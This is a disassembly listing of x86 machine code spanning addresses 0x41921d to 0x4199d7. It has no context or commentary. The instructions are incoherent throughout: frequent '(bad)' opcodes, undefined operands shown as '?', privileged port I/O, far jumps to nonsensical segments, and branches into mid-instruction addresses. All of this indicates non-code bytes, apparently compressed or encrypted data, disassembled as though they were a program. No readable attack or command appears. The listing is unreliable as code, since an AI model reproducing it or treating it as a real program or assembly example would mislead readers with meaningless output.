  41921d:	and    dh,BYTE PTR [edx+0x6dd872f1]
  419223:	dec    eax
  419224:	or     al,0x41
  419226:	sub    esi,esi
  419228:	jo     0x4191d8
  41922a:	cmp    BYTE PTR [edx-0x1b],0x5a
  41922e:	dec    edx
  41922f:	fwait
  419230:	cld    
  419231:	in     al,0x6f
  419233:	or     bl,dl
  419235:	dec    edx
  419236:	adc    al,0x39
  419238:	jns    0x41925b
  41923a:	pop    esp
  41923b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41923c:	inc    edi
  41923d:	add    eax,DWORD PTR [esi]
  41923f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419240:	pop    esp
  419241:	je     0x4192aa
  419243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419244:	dec    edi
  419245:	(bad)  
  419246:	daa    
  419247:	cwde   
  419248:	out    dx,eax
  419249:	push   ebp
  41924a:	adc    eax,0xa130376c
  41924f:	nop
  419250:	je     0x4192b6
  419252:	mov    ds:0x49fe03c0,al
  419257:	into   
  419258:	repz aad 0x3a
  41925b:	in     eax,dx
  41925c:	mov    eax,esp
  41925e:	neg    ecx
  419260:	mov    al,0xf5
  419262:	sub    cl,BYTE PTR [edx]
  419264:	cmp    al,0x61
  419266:	dec    ebx
  419268:	lods   al,BYTE PTR ds:[esi]
  419269:	or     al,0x3a
  41926b:	icebp  
  41926c:	xchg   ecx,eax
  41926d:	sbb    ebp,esi
  41926f:	sbb    al,0xcb
  419271:	mov    edx,0x2ff78bae
  419276:	adc    BYTE PTR [edx],ah
  419278:	imul   edi,DWORD PTR [edi+0x55],0xe1e04529
  41927f:	adc    bl,BYTE PTR [edi+0x7f332741]
  419285:	les    eax,FWORD PTR ds:0x9cd5c857
  41928b:	and    BYTE PTR [ecx+0x61],dh
  41928e:	sub    al,0xbc
  419290:	(bad)  
  419291:	mov    edx,0x603858fa
  419296:	pop    ds
  419297:	pop    ebx
  419298:	or     DWORD PTR [ebx+ebx*4+0x65490e08],eax
  41929f:	mov    dh,0x6c
  4192a1:	outs   dx,DWORD PTR ds:[esi]
  4192a2:	xor    al,0x32
  4192a4:	cwde   
  4192a5:	repnz in eax,dx
  4192a7:	add    cl,0xf9
  4192aa:	daa    
  4192ab:	push   edi
  4192ac:	add    eax,0xb55a1f34
  4192b1:	fmul   QWORD PTR [ebx]
  4192b3:	push   cs
  4192b4:	add    al,0x19
  4192b6:	push   esi
  4192b7:	mov    al,0xfc
  4192b9:	pop    edx
  4192ba:	jg     0x4192c4
  4192bc:	stc    
  4192bd:	sub    cl,al
  4192bf:	sbb    DWORD PTR [edi+0x4c],esp
  4192c2:	shl    DWORD PTR [edi],cl
  4192c4:	mov    DWORD PTR [ecx+0x5f],ecx
  4192c7:	jbe    0x419266
  4192c9:	stos   DWORD PTR es:[edi],eax
  4192ca:	shl    DWORD PTR ds:0x2a1a29,1
  4192d0:	xchg   edi,eax
  4192d1:	and    eax,0xd902b00f
  4192d6:	inc    edi
  4192d7:	jns    0x419294
  4192d9:	in     eax,0x38
  4192db:	(bad)  
  4192dc:	out    0x75,eax
  4192de:	jg     0x4192ce
  4192e0:	std    
  4192e1:	ret    0x8c2e
  4192e4:	(bad)  
  4192e5:	pop    ss
  4192e6:	div    DWORD PTR [edi-0x65]
  4192e9:	xor    BYTE PTR [ecx+esi*2-0x5e],dh
  4192ed:	pop    esi
  4192ee:	sbb    BYTE PTR [edx+0x3e714510],ah
  4192f4:	inc    esi
  4192f5:	jb     0x419356
  4192f7:	xchg   esi,eax
  4192f8:	mov    eax,0xc741d006
  4192fd:	lods   al,BYTE PTR ds:[esi]
  4192fe:	mov    ebx,0x7c82402b
  419303:	jns    0x419372
  419305:	mov    ebx,0xa6a71c17
  41930a:	js     0x4192b9
  41930c:	dec    esp
  41930d:	adc    DWORD PTR [edi+eax*2],esp
  419310:	sbb    dh,dh
  419312:	loop   0x4192ea
  419314:	cmp    BYTE PTR [ebp+0x2beeec17],ch
  41931a:	sbb    BYTE PTR [edx-0x41],dh
  41931d:	push   esp
  41931e:	(bad)  
  41931f:	mov    esi,ebp
  419321:	xchg   ebx,eax
  419322:	cmc    
  419323:	or     bh,BYTE PTR [ebp+0x480dd6cd]
  419329:	sbb    DWORD PTR ds:0xa63ce882,ebp
  41932f:	sbb    BYTE PTR [edi-0x40],0x15
  419333:	addr16 aam 0xcc
  419336:	xor    esp,DWORD PTR [esi]
  419338:	sbb    cl,cl
  41933a:	add    esp,DWORD PTR [ecx+0xc]
  41933d:	mov    ebp,0x8ffb7081
  419342:	and    BYTE PTR [ebx+edi*8],bh
  419345:	pop    ecx
  419346:	out    0xa0,eax
  419348:	std    
  419349:	mov    esi,0x6f5bd7b
  41934e:	scas   eax,DWORD PTR es:[edi]
  41934f:	jne    0x419389
  419351:	shl    ah,0x14
  419354:	or     ecx,DWORD PTR [esi-0x24f20234]
  41935a:	ss retf 0xb9de
  41935e:	inc    ebp
  41935f:	loope  0x419338
  419361:	jno    0x4193a5
  419363:	xor    al,0x28
  419365:	or     eax,0x89c74edd
  41936a:	mov    bh,0x7
  41936c:	inc    ebx
  41936d:	cmp    BYTE PTR [edi+edi*8+0x763dbbe],dl
  419374:	mov    ss,WORD PTR [ebx+ebp*2+0x53632a45]
  41937b:	and    al,ah
  41937d:	xlat   BYTE PTR ds:[ebx]
  41937e:	push   ecx
  41937f:	xchg   BYTE PTR [ecx+eax*4-0x7c334bf],dl
  419386:	mov    ebx,0xc392fbd9
  41938b:	sub    al,0x4b
  41938d:	inc    esi
  41938e:	mov    edx,es
  419390:	ja     0x4193ad
  419392:	inc    esp
  419393:	stos   DWORD PTR es:[edi],eax
  419394:	jmp    DWORD PTR ds:0x71e9346d
  41939a:	push   ss
  41939b:	pusha  
  41939c:	enter  0x6384,0x9e
  4193a0:	stc    
  4193a1:	xor    eax,0x83cad3e3
  4193a6:	xor    DWORD PTR [esi+0x2d81bd0e],esi
  4193ac:	popf   
  4193ad:	fcmovne st,st(1)
  4193af:	imul   ecx,DWORD PTR [edx+ecx*4+0x28],0x6aade3a2
  4193b7:	adc    eax,0xf2c22632
  4193bc:	cmp    al,BYTE PTR [edx+0x328fdca8]
  4193c2:	xor    DWORD PTR [edi+0x3b],0xa80aa1cc
  4193c9:	(bad)  
  4193ca:	push   cs
  4193cb:	(bad)  
  4193cc:	lods   eax,DWORD PTR ds:[esi]
  4193cd:	imul   edx,ebx,0x55
  4193d0:	es push 0x31119ba4
  4193d6:	xchg   ecx,eax
  4193d7:	cmp    eax,0xed813d3b
  4193dc:	xor    cl,dl
  4193de:	(bad)  
  4193df:	xchg   ecx,eax
  4193e0:	loopne 0x41938b
  4193e2:	out    0xc9,al
  4193e4:	sub    ebx,DWORD PTR [ebx+0x64056f57]
  4193ea:	stos   BYTE PTR es:[edi],al
  4193eb:	add    al,0xe0
  4193ed:	iret   
  4193ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193ef:	dec    esi
  4193f0:	mov    eax,fs
  4193f2:	test   ebp,0xcc652445
  4193f8:	lods   al,BYTE PTR ds:[esi]
  4193f9:	pop    ss
  4193fa:	inc    ecx
  4193fb:	sub    DWORD PTR [esi+0x77d2914c],ebp
  419401:	pushf  
  419402:	aam    0xe6
  419404:	sub    edi,eax
  419406:	mov    eax,ds:0xec8549d
  41940b:	and    BYTE PTR [edx+0x2a],ah
  41940e:	es sbb al,0x7f
  419411:	fdivr  DWORD PTR [ecx]
  419413:	in     eax,0xcc
  419415:	dec    edx
  419416:	inc    esi
  419417:	mov    edi,0xe33140d2
  41941c:	mov    dh,0xf2
  41941e:	or     eax,0x51858618
  419423:	(bad)  
  419424:	pop    ds
  419425:	mov    esi,0x22c4d0f2
  41942a:	fnsave [edx+ecx*4-0x44af53e7]
  419431:	push   ds
  419432:	sub    al,0x2f
  419434:	xchg   ebp,eax
  419435:	ins    BYTE PTR es:[edi],dx
  419436:	sub    eax,0x62903eb8
  41943b:	sbb    BYTE PTR [edi+0x1],al
  41943e:	pop    esi
  41943f:	mov    bl,0xa4
  419441:	shr    BYTE PTR [eax+0x47],0x1
  419445:	in     al,dx
  419446:	jo     0x4194b3
  419448:	ret    
  419449:	dec    ebp
  41944a:	cmp    edi,DWORD PTR [ecx-0x7bc2ed9c]
  419450:	pusha  
  419451:	xor    BYTE PTR [ebx+0xe5116f2],dl
  419457:	stos   DWORD PTR es:[edi],eax
  419458:	mov    esi,0x9e722144
  41945d:	lods   al,BYTE PTR ds:[esi]
  41945e:	sbb    eax,DWORD PTR [esi+0x31]
  419461:	repnz sub ch,BYTE PTR [eax-0x54272a52]
  419468:	fs test ebp,0xb8dc586e
  41946f:	rol    BYTE PTR [ecx],cl
  419471:	ins    DWORD PTR es:[edi],dx
  419472:	fwait
  419473:	aas    
  419474:	(bad)  
  419475:	mov    dh,0x32
  419477:	xor    eax,0x1a2e3351
  41947c:	fidiv  WORD PTR ds:0xda17b2aa
  419482:	inc    ecx
  419483:	push   0x24
  419485:	(bad)  
  419486:	retf   
  419487:	dec    ebx
  419488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419489:	push   cs
  41948a:	shl    BYTE PTR [ecx+0x3aec1249],cl
  419490:	xor    DWORD PTR [eax-0x64ac0e48],edi
  419496:	jl     0x419471
  419498:	inc    esp
  419499:	jp     0x4194e3
  41949b:	jg     0x4194b5
  41949d:	jbe    0x419436
  41949f:	aam    0xb9
  4194a1:	adc    edi,0x787991c6
  4194a7:	mov    edx,DWORD PTR [ecx-0x2c9d0942]
  4194ad:	cmp    bh,dh
  4194af:	adc    eax,0xacf95c61
  4194b4:	scas   al,BYTE PTR es:[edi]
  4194b5:	ret    0x5072
  4194b8:	punpckldq mm6,DWORD PTR [ebp-0x5166230e]
  4194bf:	mov    fs,WORD PTR [edx-0x986d44d]
  4194c5:	in     eax,dx
  4194c6:	jp     0x419452
  4194c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194c9:	xor    al,0x56
  4194cb:	les    ebx,FWORD PTR [ebp+0x33b3f858]
  4194d1:	cs pop esi
  4194d3:	sub    al,0x2b
  4194d5:	push   esp
  4194d6:	adc    BYTE PTR [edx],ah
  4194d8:	dec    ebp
  4194d9:	adc    eax,0xf3d21316
  4194de:	mul    BYTE PTR [edi]
  4194e0:	lds    eax,FWORD PTR [eax+0x72]
  4194e3:	lods   eax,DWORD PTR ds:[esi]
  4194e4:	adc    ebp,DWORD PTR [ebx+eiz*4+0x6b2f97a5]
  4194eb:	fwait
  4194ec:	and    BYTE PTR [edx+0x49],0x47
  4194f0:	mov    esp,?
  4194f2:	pop    ss
  4194f3:	cmp    eax,0x1841931d
  4194f8:	jp     0x4194e9
  4194fa:	ss xchg edx,eax
  4194fc:	and    bl,bl
  4194fe:	nop
  4194ff:	mov    cs,WORD PTR [esi-0x62]
  419502:	and    bl,dl
  419504:	mov    cl,0xc2
  419506:	stc    
  419507:	fs mov ah,0xee
  41950a:	mov    dl,0x13
  41950c:	fsubr  st(0),st
  41950e:	or     DWORD PTR [ebx+0x19],ebx
  419511:	pop    eax
  419512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419513:	cmp    DWORD PTR [eax+0x26f0bd43],ebp
  419519:	push   esp
  41951a:	xor    cl,BYTE PTR [ebp+0x62]
  41951d:	dec    edi
  41951e:	mov    ?,WORD PTR [esi+eiz*1]
  419521:	sub    cl,BYTE PTR [edi-0x6ee14c59]
  419527:	mov    eax,0xf2d82f0d
  41952c:	xchg   ebp,eax
  41952d:	sub    DWORD PTR [esi-0x4cc03570],edx
  419533:	jne    0x4194d3
  419535:	pop    ebx
  419536:	stos   DWORD PTR es:[edi],eax
  419537:	inc    esp
  419538:	cmp    BYTE PTR [ebp+0x2e6f23e6],bl
  41953e:	cmp    BYTE PTR [edi+0x5c967958],ch
  419544:	jge    0x419511
  419546:	mov    ch,0x6d
  419548:	sub    DWORD PTR [eax],edx
  41954a:	xor    al,0x13
  41954c:	jns    0x419540
  41954e:	add    eax,0xb631da60
  419553:	aas    
  419554:	outs   dx,DWORD PTR ds:[esi]
  419555:	push   edx
  419556:	div    BYTE PTR [edi]
  419558:	or     BYTE PTR [ebx+ebx*4-0x7c],bh
  41955c:	(bad)  
  41955d:	les    ebx,FWORD PTR [eax+0xe054019]
  419563:	push   esi
  419564:	das    
  419565:	test   eax,0xa64362d0
  41956a:	sbb    ebp,DWORD PTR [edx-0x6c]
  41956d:	pop    edx
  41956e:	dec    ebp
  41956f:	jmp    0x4194f3
  419571:	mov    esp,0xbbe3ea59
  419576:	sbb    BYTE PTR [ebp+0x6d],al
  419579:	xchg   DWORD PTR [eax+ecx*2],edx
  41957c:	daa    
  41957d:	sbb    DWORD PTR [edx-0x58],ebp
  419580:	mov    cl,0x3f
  419582:	fnsave [eax+0xa8e917a]
  419588:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419589:	inc    esi
  41958a:	push   ecx
  41958b:	popa   
  41958c:	aas    
  41958d:	call   0x82b551e3
  419592:	adc    BYTE PTR [edi-0x44014499],cl
  419598:	leave  
  419599:	add    ch,cl
  41959b:	shr    BYTE PTR ss:[edi],cl
  41959e:	std    
  41959f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195a0:	add    bl,cl
  4195a2:	loop   0x4195fd
  4195a4:	xchg   ecx,eax
  4195a5:	push   ss
  4195a6:	mov    al,0xec
  4195a8:	xchg   ebx,eax
  4195a9:	loope  0x41952d
  4195ab:	test   BYTE PTR [ecx+0x72aefb20],dh
  4195b1:	dec    esi
  4195b2:	xor    al,BYTE PTR [eax]
  4195b4:	adc    dl,BYTE PTR [ecx-0x2b]
  4195b7:	xor    BYTE PTR [ebx],0x2b
  4195ba:	(bad)  
  4195bb:	daa    
  4195bc:	dec    ebx
  4195bd:	push   esp
  4195be:	cmp    eax,0xd0e3edf5
  4195c3:	in     al,dx
  4195c4:	stos   BYTE PTR es:[edi],al
  4195c5:	lmsw   WORD PTR [eax+0x36]
  4195c9:	ffreep st(3)
  4195cb:	les    edi,FWORD PTR [ecx+0x303c6936]
  4195d1:	sub    edx,DWORD PTR [ecx]
  4195d3:	jmp    0x4195ff
  4195d5:	inc    ebx
  4195d6:	push   esi
  4195d7:	in     eax,dx
  4195d8:	add    BYTE PTR [eax+eiz*2],dh
  4195db:	sub    al,0x2
  4195dd:	inc    esp
  4195de:	jae    0x4195bf
  4195e0:	lods   eax,DWORD PTR ds:[esi]
  4195e1:	or     BYTE PTR [edi+ecx*2+0x4c],dh
  4195e5:	dec    eax
  4195e6:	retf   0x6d13
  4195e9:	es jg  0x41961b
  4195ec:	test   eax,0x36d443f9
  4195f1:	add    dl,0xa2
  4195f4:	xlat   BYTE PTR ds:[ebx]
  4195f5:	in     eax,0x1a
  4195f7:	inc    BYTE PTR [edi+0x4c]
  4195fa:	mul    DWORD PTR [ebx-0x5c]
  4195fd:	call   0xe97d4df6
  419602:	pushf  
  419603:	hlt    
  419604:	pop    edi
  419605:	nop
  419606:	(bad)  
  419607:	loope  0x4195f2
  419609:	push   bp
  41960b:	or     cl,BYTE PTR [ebx+edi*8+0x2]
  41960f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419610:	out    dx,al
  419611:	hlt    
  419612:	mov    ebx,0xd8119307
  419617:	(bad)  
  419618:	(bad)  
  419619:	mov    eax,0x5cc02a29
  41961e:	mov    esi,0x1e31e9cd
  419623:	mov    ch,0xb
  419625:	bound  ebp,QWORD PTR [edi]
  419627:	cmp    al,0x46
  419629:	xor    ch,dh
  41962b:	xchg   DWORD PTR [ecx],ebp
  41962d:	sbb    ch,al
  41962f:	sub    bh,cl
  419631:	pop    ds
  419632:	pop    ebp
  419633:	xor    al,0xc5
  419635:	pop    ebp
  419636:	mov    ebp,0x7c425a4a
  41963b:	stos   DWORD PTR es:[edi],eax
  41963c:	dec    edi
  41963d:	add    ecx,DWORD PTR [edi+0x75]
  419640:	or     esp,eax
  419642:	jmp    0x41964e
  419644:	das    
  419645:	je     0x41960a
  419647:	(bad)  
  419648:	jb     0x41966f
  41964a:	and    DWORD PTR [ecx-0x5f],edx
  41964d:	dec    edx
  41964e:	test   al,0xee
  419650:	sbb    BYTE PTR [edi+0x1e],dl
  419653:	loopne 0x4196a5
  419655:	add    DWORD PTR [esi],esi
  419657:	js     0x4196a6
  419659:	sahf   
  41965a:	fbld   TBYTE PTR [esp+esi*4+0x2e]
  41965e:	in     eax,0x43
  419660:	sbb    dh,BYTE PTR [esi+eiz*8-0x33]
  419664:	cmc    
  419665:	pop    edx
  419666:	movnti DWORD PTR [eax+0x47b08f11],ebx
  41966d:	pop    ss
  41966e:	and    ebx,DWORD PTR [edx]
  419670:	dec    esp
  419671:	mov    ebp,0xea6ff9f
  419676:	jns    0x4196f0
  419678:	icebp  
  419679:	xlat   BYTE PTR ds:[ebx]
  41967a:	xor    bl,BYTE PTR [edi+0x234eebde]
  419680:	pop    edi
  419681:	and    ch,BYTE PTR [ecx+0x4176f86c]
  419687:	ja     0x41962f
  419689:	xor    esi,DWORD PTR [esi]
  41968b:	dec    ebx
  41968c:	mov    ecx,0xfbf20078
  419691:	(bad)  
  419693:	add    ebx,ebx
  419695:	lods   al,BYTE PTR ds:[esi]
  419696:	sub    al,0xe9
  419698:	cmovae esi,DWORD PTR [edi+0x17]
  41969c:	scas   al,BYTE PTR es:[edi]
  41969d:	sub    al,0xbe
  41969f:	or     al,0xae
  4196a1:	inc    edi
  4196a2:	test   al,0xa6
  4196a4:	cs js  0x4196c5
  4196a7:	outs   dx,BYTE PTR ds:[esi]
  4196a8:	push   es
  4196a9:	stos   BYTE PTR es:[edi],al
  4196aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196ab:	inc    edx
  4196ac:	fwait
  4196ad:	inc    esi
  4196ae:	in     eax,0x89
  4196b0:	mov    esi,DWORD PTR [esp+esi*2+0x6655f269]
  4196b7:	repz cwde 
  4196b9:	loopne 0x4196bd
  4196bb:	mov    edi,0x105f83bf
  4196c0:	jecxz  0x4196fc
  4196c2:	and    DWORD PTR [ebx],0xd1cdb5eb
  4196c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196c9:	enter  0xa01c,0x8d
  4196cd:	sbb    DWORD PTR [edx-0x74],ebp
  4196d0:	retf   
  4196d1:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4196d3:	ficomp DWORD PTR [ecx]
  4196d5:	dec    edx
  4196d6:	repnz cwde 
  4196d8:	fwait
  4196d9:	outs   dx,DWORD PTR ds:[esi]
  4196da:	and    DWORD PTR [eax],ebx
  4196dc:	cmp    al,0xca
  4196de:	push   ebx
  4196df:	ja     0x41971d
  4196e1:	enter  0xba6e,0x4a
  4196e5:	daa    
  4196e6:	push   esi
  4196e7:	sub    DWORD PTR [ebx-0x21],eax
  4196ea:	je     0x419765
  4196ec:	jmp    0x41976d
  4196ee:	xchg   ah,al
  4196f0:	leave  
  4196f1:	push   ebp
  4196f2:	add    dh,dh
  4196f4:	dec    ebx
  4196f5:	mov    ebx,0xdf024430
  4196fa:	cwde   
  4196fb:	add    eax,0x6626e0f1
  419700:	leave  
  419701:	sbb    al,0x16
  419703:	clc    
  419704:	leave  
  419705:	and    edx,eax
  419707:	std    
  419708:	fldcw  WORD PTR [ebp+0x1f]
  41970b:	pusha  
  41970c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41970d:	sbb    BYTE PTR [edi],bh
  41970f:	aaa    
  419710:	ins    BYTE PTR es:[edi],dx
  419711:	int3   
  419712:	js     0x41970c
  419714:	sub    dl,BYTE PTR [edi-0x4c]
  419717:	sar    BYTE PTR [edx-0x626a36fa],1
  41971d:	fidiv  WORD PTR [ebx-0x69]
  419720:	(bad)  
  419722:	bound  esp,QWORD PTR [ecx]
  419724:	in     al,dx
  419725:	neg    BYTE PTR [ebp+0x22]
  419728:	push   ss
  419729:	push   esi
  41972a:	cmp    BYTE PTR [ecx-0x3c],dl
  41972d:	scas   eax,DWORD PTR es:[edi]
  41972e:	and    dl,BYTE PTR [esi+0x668a13fa]
  419734:	and    al,0xd6
  419736:	daa    
  419737:	pusha  
  419738:	xor    eax,0xbca9c759
  41973d:	cmp    bl,BYTE PTR [esi+0x14]
  419740:	jmp    0x4196cc
  419742:	and    eax,DWORD PTR [eax-0x72]
  419745:	push   0xe
  419747:	push   ebp
  419748:	sub    al,0xd
  41974a:	imul   ebx,edi,0xffffffe7
  41974d:	fs test cl,dl
  419750:	scas   al,BYTE PTR es:[edi]
  419751:	cmc    
  419752:	jo     0x4197b0
  419754:	les    ebx,FWORD PTR [eax+0x7b]
  419757:	test   ebp,edi
  419759:	aaa    
  41975a:	or     esp,esp
  41975c:	and    eax,0x2f05efa1
  419761:	fnsave [ebp-0x49]
  419764:	push   eax
  419765:	or     BYTE PTR [ebx+esi*2-0x2fe8efeb],cl
  41976c:	pop    es
  41976d:	mov    esp,0x3e8e5ba9
  419772:	sbb    BYTE PTR [edx-0x6],0xdc
  419776:	mov    esi,ecx
  419778:	imul   BYTE PTR [eax+0x50]
  41977b:	push   0x68
  41977d:	lods   al,BYTE PTR ds:[esi]
  41977e:	imul   ebp,DWORD PTR [eax],0x5b1b1cc3
  419784:	fcomp  st(4)
  419786:	xchg   ebx,eax
  419787:	arpl   WORD PTR [eax-0x31],dx
  41978a:	dec    esi
  41978b:	pop    edi
  41978c:	mov    al,ds:0x464fa0c4
  419791:	mov    edi,0x878504e2
  419796:	and    eax,0xc2673fc0
  41979b:	add    ah,al
  41979d:	rcr    BYTE PTR [edi-0x34],cl
  4197a0:	jp     0x41980b
  4197a2:	imul   eax,edx,0xcf44568b
  4197a8:	xchg   edx,eax
  4197a9:	pop    esi
  4197aa:	push   es
  4197ab:	mov    eax,0x8d7cd3ef
  4197b0:	push   cs
  4197b1:	mov    ebp,0x2c8376c3
  4197b6:	call   0x4713:0xb177dca
  4197bd:	cmp    DWORD PTR [esi],esp
  4197bf:	push   ecx
  4197c0:	(bad)  
  4197c1:	jb     0x419831
  4197c3:	ficom  DWORD PTR [ecx-0x7f12b4b8]
  4197c9:	xor    esp,DWORD PTR [ebp+0x1efcfcac]
  4197cf:	fisttp DWORD PTR [esi+0x1894c21f]
  4197d5:	(bad)  
  4197d7:	ins    BYTE PTR es:[edi],dx
  4197d8:	inc    edi
  4197d9:	dec    ebp
  4197da:	call   0x530b:0x48425655
  4197e1:	ficom  DWORD PTR ss:[bx]
  4197e5:	sahf   
  4197e6:	ds mov dl,0xfc
  4197e9:	retf   
  4197ea:	test   al,0xc1
  4197ec:	sbb    DWORD PTR [edi+0x3877e3be],esp
  4197f2:	cld    
  4197f3:	imul   DWORD PTR [ebx-0x38]
  4197f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197f7:	(bad)  
  4197f9:	mov    edx,0x8df7734e
  4197fe:	dec    ecx
  4197ff:	cmp    BYTE PTR [edx-0x702111c2],0xcd
  419806:	inc    esi
  419807:	mov    ch,0x7d
  419809:	add    edi,esp
  41980b:	cwde   
  41980c:	pushf  
  41980d:	mov    bl,0x7d
  41980f:	aad    0xd5
  419811:	sar    DWORD PTR [ecx-0x76dcbe74],0xda
  419818:	jl     0x41985f
  41981a:	inc    ecx
  41981b:	jb     0x419889
  41981d:	(bad)  ds:0xf4eb4143
  419823:	aam    0x8e
  419825:	adc    DWORD PTR [ecx],eax
  419827:	lock shl ecx,1
  41982a:	mov    dl,0xed
  41982c:	cmp    dl,BYTE PTR [ebx]
  41982e:	fcomp  DWORD PTR [eax-0x62]
  419831:	add    BYTE PTR [edx-0x61],bh
  419834:	cmp    ecx,DWORD PTR [edx]
  419836:	mov    DWORD PTR [edi],esp
  419838:	mov    ?,edx
  41983a:	mov    ah,BYTE PTR [ebx-0x50a59dae]
  419840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419841:	mov    ecx,0x9cd81cf4
  419846:	add    eax,0xacd909ff
  41984b:	xchg   esi,eax
  41984c:	mov    edi,DWORD PTR [edx+0x23]
  41984f:	int    0x81
  419851:	mov    dl,0xf5
  419853:	or     edi,DWORD PTR ss:[esi+edi*8-0x3f]
  419858:	mov    ebx,0xb8502328
  41985d:	mov    cl,0x22
  41985f:	retf   0xa680
  419862:	enter  0xc6df,0xad
  419866:	shl    ebx,0xa2
  419869:	sub    DWORD PTR ds:0x34a7fe06,esi
  41986f:	ret    0xb06d
  419872:	les    edx,FWORD PTR [ebp-0x7ec7be85]
  419878:	pop    esp
  419879:	icebp  
  41987a:	and    DWORD PTR [edi+0x36451531],eax
  419880:	stos   DWORD PTR es:[edi],eax
  419881:	fnstsw WORD PTR [ecx-0x52]
  419884:	into   
  419885:	xchg   edx,eax
  419886:	adc    edi,esi
  419888:	loope  0x4198d2
  41988a:	mov    dh,0xc3
  41988c:	imul   edi,esi,0xffffffe2
  41988f:	lods   eax,DWORD PTR ds:[esi]
  419890:	(bad)  
  419891:	mov    ch,0x2d
  419893:	adc    eax,0xdacefdd4
  419898:	and    dl,BYTE PTR ds:0x6592b63a
  41989e:	fld    TBYTE PTR [edx]
  4198a0:	fmul   DWORD PTR [ebx+0x6b]
  4198a3:	std    
  4198a4:	ins    BYTE PTR es:[edi],dx
  4198a5:	rol    DWORD PTR [ecx-0x13],1
  4198a8:	mov    edi,DWORD PTR [edi+0x1d9fa14f]
  4198ae:	mov    DWORD PTR [ebp-0xf],edi
  4198b1:	les    esi,FWORD PTR [ecx+0x239eb9e7]
  4198b7:	(bad)  [edi-0x4b24010]
  4198bd:	inc    edi
  4198be:	(bad)  
  4198bf:	cmp    esi,ebx
  4198c1:	mov    ds:0xa3bdc155,eax
  4198c6:	in     al,0x21
  4198c8:	fiadd  WORD PTR [edi]
  4198ca:	mov    ecx,0x88ed209c
  4198cf:	popf   
  4198d0:	loope  0x419897
  4198d2:	cld    
  4198d3:	popf   
  4198d4:	jle    0x4198ba
  4198d6:	psubusb mm4,QWORD PTR [ecx]
  4198d9:	test   al,0x56
  4198db:	push   ecx
  4198dc:	add    edi,DWORD PTR [edx+0x5cccef63]
  4198e2:	cmp    DWORD PTR [esi-0x4],0xfffffffd
  4198e6:	mov    ch,0x85
  4198e8:	jae    0x4198f7
  4198ea:	add    al,0x8c
  4198ec:	outs   dx,BYTE PTR ds:[esi]
  4198ed:	adc    DWORD PTR [esi],edi
  4198ef:	jecxz  0x4198c8
  4198f1:	test   BYTE PTR [ebp+0x56],dl
  4198f4:	aam    0x7d
  4198f6:	sub    DWORD PTR ds:0x248f9e7e,edx
  4198fc:	out    dx,eax
  4198fd:	std    
  4198fe:	loopne 0x4198ea
  419900:	or     BYTE PTR [edi],ah
  419902:	jmp    0x208b:0xd8ab1ec0
  419909:	in     al,0xd8
  41990b:	sub    eax,0x54dffb82
  419910:	lahf   
  419911:	pop    ebx
  419912:	loope  0x41992e
  419914:	adc    edi,ecx
  419916:	sbb    bh,BYTE PTR [esi]
  419918:	jecxz  0x4198ec
  41991a:	xchg   esp,eax
  41991b:	or     eax,0x505f48aa
  419920:	cli    
  419921:	das    
  419922:	cmc    
  419923:	loopne 0x4198a8
  419925:	sub    al,0x27
  419927:	jb     0x66cb2e49
  41992d:	push   esp
  41992e:	jmp    0xe89c:0xc33c37ec
  419935:	fcomi  st,st(6)
  419937:	popf   
  419938:	das    
  419939:	mov    ecx,0x4b85fd6c
  41993e:	lea    edi,[edi+0x16]
  419941:	clc    
  419942:	je     0x419933
  419944:	mov    dl,0xe2
  419946:	adc    DWORD PTR ds:0xe055ff4c,edi
  41994c:	sbb    bl,BYTE PTR [edx+ecx*8-0x2b]
  419950:	xchg   ecx,eax
  419951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419952:	xchg   ebp,eax
  419953:	mov    bl,0xc1
  419955:	(bad)  
  419956:	pop    ss
  419957:	aas    
  419958:	fidiv  DWORD PTR [ebx-0xa70cf8e]
  41995e:	sub    al,0x6
  419960:	sbb    ecx,DWORD PTR [ebx+0x1b5b412f]
  419966:	icebp  
  419967:	in     eax,dx
  419968:	mov    cl,0xb6
  41996a:	add    dl,0x3
  41996d:	(bad)  
  41996e:	cmp    cl,al
  419970:	mov    ebx,0x21057834
  419975:	dec    edi
  419976:	mov    bh,BYTE PTR [edx+0x9791016]
  41997c:	jo     0x419975
  41997e:	imul   ebp,DWORD PTR [ecx-0x37128625],0x8a09a999
  419988:	fwait
  419989:	call   0xf93ca4ee
  41998e:	ret    0x5176
  419991:	iret   
  419992:	sub    DWORD PTR [ecx],ecx
  419994:	sar    cl,cl
  419996:	pop    es
  419997:	fdivr  QWORD PTR es:[eax]
  41999a:	cwde   
  41999b:	jmp    0xcf42:0xbb64d0af
  4199a2:	push   ebx
  4199a3:	jp     0x419928
  4199a5:	mov    bh,0xc3
  4199a7:	leave  
  4199a8:	dec    edi
  4199a9:	xchg   BYTE PTR [eax],ah
  4199ab:	cmp    eax,0xcab2e44f
  4199b0:	jo     0x419a0f
  4199b2:	cmp    al,0xd1
  4199b4:	add    ebp,esp
  4199b6:	jae    0x419976
  4199b8:	sub    BYTE PTR [edx+0x57fa7360],ch
  4199be:	or     ecx,edi
  4199c0:	js     0x419989
  4199c2:	xchg   edx,eax
  4199c3:	inc    edi
  4199c4:	outs   dx,DWORD PTR ds:[esi]
  4199c5:	add    al,0x32
  4199c7:	ret    
  4199c8:	push   ds
  4199c9:	mov    cl,0x18
  4199cb:	imul   ebp,DWORD PTR [edx-0x478f250c],0xa96d91a7
  4199d5:	(bad)  
  4199d6:	pusha  
  4199d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
